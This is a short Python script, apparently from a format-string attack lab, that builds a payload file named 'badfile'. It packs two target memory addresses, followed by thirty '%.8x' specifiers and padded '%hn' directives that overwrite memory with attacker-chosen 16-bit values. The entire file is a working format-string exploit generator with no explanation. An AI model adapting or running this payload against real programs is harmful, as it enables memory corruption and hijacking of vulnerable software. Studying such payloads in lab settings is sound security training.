N = 1500
content = bytearray(0x0 for i in range(N))

number = 0x080e506a
content[0:4] = (number).to_bytes(4, byteorder='little')
s= "@@@@"
fmt = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt
number = 0x080e5068
content[8:12] = (number).to_bytes(4, byteorder='little')



s = "%.8x" * 30 + "%.65181x" + "%hn" + "%.103x" + "%hn" + "\n"
fmt = (s).encode('latin-1')
content[12:12 + len(fmt)] = fmt

file = open("badfile", "wb")
file.write(content)
file.close()